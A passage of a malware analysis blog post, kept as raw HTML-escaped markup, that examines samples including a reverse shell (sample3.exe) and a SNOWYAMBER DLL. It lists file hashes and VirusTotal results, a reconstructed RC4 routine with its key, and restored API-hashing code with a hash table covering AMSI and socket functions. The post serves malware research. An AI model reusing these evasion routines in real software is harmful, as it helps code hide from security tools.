    &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// using %256 to avoid exceed the array limit&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;//Swap S[i] &amp;amp; S[j]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// XOR generated S[t] with Byte from the plaintext / cipher and append each Encrypted/Decrypted byte to result array&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;HeapFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessHeap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;HeapFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessHeap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The encryption/decryption key is:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PCSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C2B55923&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;sample3.exe&lt;/em&gt; - this sample plays the role of a reverse shell:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;9216 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;68d957f5fbb2f2078da9059995ece969&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;545ccdb7e68c6cef6271698c0815db33625aae03&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6dc1393ccacd031fa0141aa312d55deb2552a7a95c3ae21856c82beb21a554bd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First of all, check our sample via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/6dc1393ccacd031fa0141aa312d55deb2552a7a95c3ae21856c82beb21a554bd/detection&quot;&gt;https://www.virustotal.com/gui/file/6dc1393ccacd031fa0141aa312d55deb2552a7a95c3ae21856c82beb21a554bd/detection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_06-30.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So, 14 of 71 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;More of them detect file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gen:Heur.Loregun.19&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Contacted IP addresses:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_01-39.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The logic of this sample is pretty simple: create a socket, listen on it, transfer all I/O to the socket.&lt;/p&gt;

&lt;h3 id=&quot;malware-evasion-tricks&quot;&gt;Malware evasion tricks&lt;/h3&gt;

&lt;p&gt;RVA to offset:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_02-22.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We restored WinAPI hashing logic:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define UPCASE(wch)                     \
  (((wch) &amp;gt;= 'a') &amp;amp;&amp;amp; ((wch) &amp;lt;= 'z') ? \
      (wch)                           \
  :                                   \
      ((wch) + ('a'-'A'))             \
  )                                   
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HashA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PCSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65599&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UPCASE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HashW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PCWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;WCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65599&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UPCASE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TmpHashValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and hashing table:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_02-11.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mh&quot;&gt;0x8ba508f3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//AmsiScanBuffer&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xc4f4eb06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//AmsiOpenSession&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xea48872c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//CloseHandle&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x3bc77547&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//closesocket&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x96d3ba46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//connect&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x8278b698&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//CreateMutexW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x609502e8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//CreateProcessW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x1347fdfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//ExitProcess&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x27bcb342&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//ExpandEnvironmentStringsW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x5366ed60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//FreeAddrInfoW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x39c8604e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//GetAddrInfoW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x26f75d64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//GetCurrentThreadId&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x55e2cac2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//GetFileAttributesW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xab26d610&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//GetLastError&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xbd71d0e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//LoadLibraryA&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xbd71d0ce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//LoadLibraryW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x23dcad1c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrcatA&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xd84484d6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrcpyA&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x23dcad6a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrcatW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xdfc07835&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrcmpiA&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xdfc07803&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrcmpiW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xd844bb3c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrcpyW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x468d52ab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrlenW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x468d525d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//lstrlenA&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xf94e8b9f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//MessageBoxW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x326d0bc9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//MultiByteToWideChar&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x11983657&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//NtTraceEvent&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x9293ab58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//OutputDebugStringW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xc83db0b4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//ReleaseMutex&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xbdcac89f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlAllocateHeap&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x3c3e5b30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlCompareMemory&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x1dc948b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlMoveMemory&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x3519f2b9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlDosPathNameToNtPathName_U&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xce521091&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlExitUserThread&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x4ead0e2e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlFreeHeap&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xfc4d07c0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlGetVersion&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xe24742d8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlInitUnicodeString&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xb1d4a311&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlNtStatusToDosError&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x819c55ff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//RtlZeroMemory&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xd66bb51c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//SetLastError&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x0f8a6e1b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//Sleep&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x036a4566&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//VirtualAlloc&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x0033e9b1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//VirtualAllocEx&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xc7433c7b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//VirtualFree&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xaa9a1e06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//VirtualFreeEx&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x61462271&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//VirtualQuery&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x9f79559c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//WaitForMultipleObjects&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x4b570e37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//WaitForSingleObject&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x85729171&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//WideCharToMultiByte&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x874700d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//WSACleanup&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0x90b71e53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//WSASocketW&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xa48ed094&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//WSAStartup&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xfdb3b358&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//wvsprintfA&lt;/span&gt;
&lt;span class=&quot;mh&quot;&gt;0xfdb3b3a6&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//wvsprintfW&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;sample4.exe&lt;/em&gt; - this sample is SNOWYAMBER DLL&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;270336 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;d0efe94196b4923eb644ec0b53d226cc&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c938934c0f5304541087313382aee163e0c5239c&lt;/code&gt;  &lt;br /&gt;
